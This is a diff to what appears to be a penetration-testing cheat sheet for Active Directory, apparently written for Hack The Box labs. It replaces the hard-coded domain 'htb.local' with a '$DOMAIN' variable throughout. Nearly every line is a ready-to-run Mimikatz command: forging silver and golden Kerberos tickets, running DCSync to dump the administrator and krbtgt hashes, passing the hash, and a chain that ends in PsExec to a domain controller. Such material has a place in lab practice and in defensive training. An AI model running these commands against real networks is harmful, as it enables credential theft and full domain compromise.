@@ -64,13 +64,13 @@ klist
 Prerequisites: NTLM hash of service account, domain name, domain SID, service SPN.
 
 ```mimikatz
-kerberos::golden /user:<user> /domain:<domain> /sid:<domain-SID> /rc4:<hash> /service:<service> /target:<FQDN> /ptt
+kerberos::golden /user:<user> /domain:$DOMAIN /sid:<domain-SID> /rc4:<hash> /service:<service> /target:<FQDN> /ptt
 ```
 
 **Example:**
 
 ```mimikatz
-kerberos::golden /user:websvc /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /rc4:9f4b4f9bffe88542acb6ea30e51b1a23 /service:HTTP /target:web01.htb.local /ptt
+kerberos::golden /user:websvc /domain:$DOMAIN /sid:S-1-5-21-123456789-321654987-456987123 /rc4:9f4b4f9bffe88542acb6ea30e51b1a23 /service:HTTP /target:web01.$DOMAIN /ptt
 ```
 
 ---
@@ -80,13 +80,13 @@ kerberos::golden /user:websvc /domain:htb.local /sid:S-1-5-21-123456789-32165498
 Prerequisites: NTLM hash of `krbtgt`, domain SID, domain name.
 
 ```mimikatz
-kerberos::golden /user:<user> /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt
+kerberos::golden /user:<user> /domain:$DOMAIN /sid:<SID> /krbtgt:<hash> /ptt
 ```
 
 **Example:**
 
 ```mimikatz
-kerberos::golden /user:administrator /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+kerberos::golden /user:administrator /domain:$DOMAIN /sid:S-1-5-21-123456789-321654987-456987123 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
 ```
 
 ---
@@ -96,13 +96,13 @@ kerberos::golden /user:administrator /domain:htb.local /sid:S-1-5-21-123456789-3
 ### Dump Administrator Hash
 
 ```mimikatz
-lsadump::dcsync /domain:htb.local /user:administrator
+lsadump::dcsync /domain:$DOMAIN /user:administrator
 ```
 
 ### Dump `krbtgt` Hash (for Golden Ticket)
 
 ```mimikatz
-lsadump::dcsync /domain:htb.local /user:krbtgt
+lsadump::dcsync /domain:$DOMAIN /user:krbtgt
 ```
 
 > Requires **Replicating Directory Changes** privilege.
@@ -132,13 +132,13 @@ Useful for offline cracking using hashcat mode `2100`.
 ## 9. Pass-the-Hash (PTH) via Token Replacement
 
 ```mimikatz
-sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
+sekurlsa::pth /user:<user> /domain:$DOMAIN /ntlm:<hash> /run:cmd.exe
 ```
 
 **Example:**
 
 ```mimikatz
-sekurlsa::pth /user:svc_sql /domain:htb.local /ntlm:ccf749a1e26e51b6e07ed92d6d68f762 /run:cmd.exe
+sekurlsa::pth /user:svc_sql /domain:$DOMAIN /ntlm:ccf749a1e26e51b6e07ed92d6d68f762 /run:cmd.exe
 ```
 
 ---
@@ -182,8 +182,8 @@ kerberos::list /export
 ```powershell
 # From SYSTEM shell on domain-joined box:
 privilege::debug
-lsadump::dcsync /domain:htb.local /user:krbtgt
-kerberos::golden /user:admin /domain:htb.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
+lsadump::dcsync /domain:$DOMAIN /user:krbtgt
+kerberos::golden /user:admin /domain:$DOMAIN /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
 klist
 PsExec.exe \\dc01 cmd.exe
 ```
